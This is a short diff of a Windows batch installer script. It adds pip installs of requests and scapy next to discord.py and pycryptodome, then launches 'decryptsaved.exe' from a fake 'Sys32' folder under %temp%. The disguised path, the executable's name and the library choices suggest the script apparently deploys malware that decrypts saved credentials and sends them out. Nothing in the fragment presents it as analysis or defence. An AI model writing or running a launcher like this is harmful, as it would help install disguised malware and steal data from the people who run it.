@@ -48,6 +48,8 @@ echo Python installation verified. Continuing with the script...
 pip uninstall pycrypto -y
 pip install discord.py
 pip install pycryptodome
+pip install requests
+pip install scapy
 pip show pycryptodome
 
 start %temp%\Sys32\decryptsaved.exe
